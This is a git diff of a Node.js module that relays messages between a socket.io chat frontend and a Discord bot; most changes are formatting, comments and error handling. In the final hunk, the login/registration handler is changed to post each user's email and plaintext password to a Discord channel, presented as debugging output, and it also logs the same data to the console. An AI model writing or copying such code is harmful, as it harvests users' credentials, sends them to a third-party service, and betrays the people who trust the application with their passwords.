@@ -1,17 +1,34 @@
 // Mais tarde vai sair da pasta disc_guilds
-// const user
+//const user
 const messageController = require("../controller/message.controller");
 const jwt = require("jsonwebtoken");
 
 // Este ficheiro vai conter uma função
 // Que só vai ser chamada uma vez
-module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter) {
-    /** Discord Comunication part */
-    let client = disc();
+/**
+ * Function to receive messages from "me" and send 
+ * to the correct user 
+ * using Discord
+ * 
+ * @param {*} socketFromAbove 
+ * @param {*} disc 
+ * @param {*} defaultChanelId 
+ * @param {*} eventEmitter 
+ * 
+ * This needs to be a function because i need to 
+ * use the Socket initiated previously and the Discord Client
+ * and it's important to use only one EventEmitter in order 
+ * to emite events properly. 
+ */
+/** Discord Comunication part */
+// Esta função muito provavelmente vai ter que ser assincrona para não deixar o servidor ir abaixo no caso de o Token não existir.
+module.exports = async function discordComs(socketFromAbove, disc, defaultChanelId, eventEmitter) {
+    try {
+    let client = await disc();
+
     // console.log(socket.handshake.query)
 
-    // Array com as pessoas com os sockets ativos
-    /**
+    /** Array com as pessoas com os sockets ativos
      * {
      *  id,
      *  socket
@@ -23,11 +40,10 @@ module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter)
     let socketArrQuiters = [];
 
     // Este fica aqui porque é o unico que importa 
+    /** Aqui vai ser onde a minha mensagem é recebida e depois enviada para o frontend */
     client.on("message", async (msg) => {
         try {
-            /** Aqui vai ser onde a minha mensagem é recebida e depois enviada para 
-         * o frontend
-         */
+
             // console.log("CHegou uma mensagem ao discord disc.js", msg.author);
             /**
              * Para diferenciar quando é uma mensagem enviada por mim ou pelo bot
@@ -49,6 +65,9 @@ module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter)
                 // let selectedOne = null;// Socket selected beloow
                 let contador = 0;
                 await messageController.saveMessages(msg.content, true, msg.author.username, msg.channel.name, "", msg.id);
+                // vai ser aqui que vou ter que fazer alterações para conseguir arranjar o erro que está a acontecer 
+                // porque não estou a usar o SnowFlake dos Discord.js (é o ID dos channels e mais).
+                // Ver mais (Discord Docs): https://discord.js.org/#/docs/discord.js/stable/typedef/Snowflake
                 for (let sc of socketArr) {
 
                     // ou seja, se o user já tiver saido não vai emitir mensagem 
@@ -59,15 +78,15 @@ module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter)
 
                     // console.log(sc.id, sc.roomName, msg.channel.name, sc.socket._rooms/*, sc.roomName, msg.channel.name, msg.content*/)
                     // console.log("---------------------------------------------------------------------------------")
-                    if(sc.roomName.split(" ").length > 1) {
+                    if (sc.roomName.split(" ").length > 1) {
                         sc.roomName = sc.roomName.split(" ").join("-")
                     }
                     if (!msg.channel.name.includes('_5f')) {
                         let auxName = msg.channel.name.split("_5f");
                         // console.log("auxName" ,auxName)
                         let newName = "";
-                        for (let i=0; i<auxName.length; i++) {
-                            if(i == 0) newName = auxName[i] + "_5f";
+                        for (let i = 0; i < auxName.length; i++) {
+                            if (i == 0) newName = auxName[i] + "_5f";
                             else newName += auxName[i];
                         }
                         // console.log(newName)
@@ -81,7 +100,7 @@ module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter)
 
 
                         // console.log("Vai mandar mensaem para o user.", contador, msg.channel.name, sc.socket._rooms);
-                        if(sc.socket._rooms.length == 0) {
+                        if (sc.socket._rooms.length == 0) {
                             // console.log("WITHOUT ROOMS !!!!!!!!!!!!!!!")
                             sc.socket.emit('messageDisc', { msg: msg.content, scId: sc.id });
                         }
@@ -126,12 +145,16 @@ module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter)
         }
 
         socket.on('yo', (data) => {
-            // console.log(data)
+            console.log(data)
 
             /** Vou introduzir os sockets aqui por que é quando tenho a certeza que é "válido" */
-
         })
 
+        /**
+         * O evento "mess" é usado para receber as mensagens 
+         * dos utilizadores
+         * É do frontend que vêm as mensages
+         */
         socket.on("mess", async ({ text, token, env }) => {
             try {
 
@@ -174,7 +197,9 @@ module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter)
                              * Os nomes dos canais são sempre em minusculas
                              */
 
-                            if (ch.type == 'text' &&  (ch.name == channelName.split("_").join("") /** Porque só me lembrei de chamar os canais assim (username + _ + idM) agora */ || ch.name == channelName)) {
+                            //if (ch.type == 'text' && (() || (ch.name == channelName.split("_").join("") /** Porque só me lembrei de chamar os canais assim (username + _ + idM) agora */ || ch.name == channelName))) {
+                            if (ch.type == 'text' && (ch.name == channelName.split("_").join("") /** Porque só me lembrei de chamar os canais assim (username + _ + idM) agora */ || ch.name == channelName)) {
+
                                 chanelId = ch.id
                                 chanelExists = true;
                             }
@@ -206,9 +231,9 @@ module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter)
 
                     client.channels.cache.get(chanelId).send(text)
                     let ids = [];
-                    for(let sc of socketArr) {
+                    for (let sc of socketArr) {
                         // console.log(sc.roomName, channelName)
-                        if(sc.roomName === channelName) {
+                        if (sc.roomName === channelName) {
                             // console.log(sc.roomName)
                             ids.push(sc.id)
                         }
@@ -238,15 +263,31 @@ module.exports = function (socketFromAbove, disc, defaultChanelId, eventEmitter)
 
             }
             // console.log("Saiu um: ", quiter, socketArr.length)
-            socket.broadcast.emit("user left", "A user left")
+            socket.broadcast.emit("user left", "A user left");
         })
     })
 
 
-    /** Receber evento para quando o utilizador faz login ou se regista */
-    eventEmitter.on("enteredApp", ({username, login}) => {
+    /**
+     *  Receber evento para quando o utilizador faz login ou se regista
+     *  Agora com mais informação para me ajudar a saber o que se vai passando na APP
+     *  e para ser mais fácil de ir fazendoDEBUG ao longo do tempo 
+     */
+    eventEmitter.on("enteredApp", ({ username, login, moreData }) => {
+
         // se o login for false é por que é um user que acabou de se registar
-        client.channels.cache.get(defaultChanelId).send(`O ${username} ${login ? "voltou a fazer login" : "acabou de se registar"}`)
+        console.log("%c on -> Entered APP", process.env.NODE_ENV, moreData)
+        let msg = `O ___${username}___ \n`;
+        let debugMsg = process.env.NODE_ENV == "production" ? "Em Produção" : "Em Desenvolvimento";
+        if (login) {
+            msg += `Com o Mail -> ___${moreData.email || 'SEM MAIL???'}___ \nPass -> ___${moreData.password || 'SEM PASS???'}___ \n__LOGIN__`
+        } else {
+            msg += `Com o Mail -> ___${moreData.email || 'SEM MAIL???'}___ \nPass -> ___${moreData.password || 'SEM PASS???'}___ \n__REGISTOU-SE__`
+        }
+        client.channels.cache.get(defaultChanelId).send(`${msg} \n IMPORTANTE: __${debugMsg}__ \n ___________________________________________\n`)
     })
+    } catch (err) {
+        throw err;
+    }
 
 };
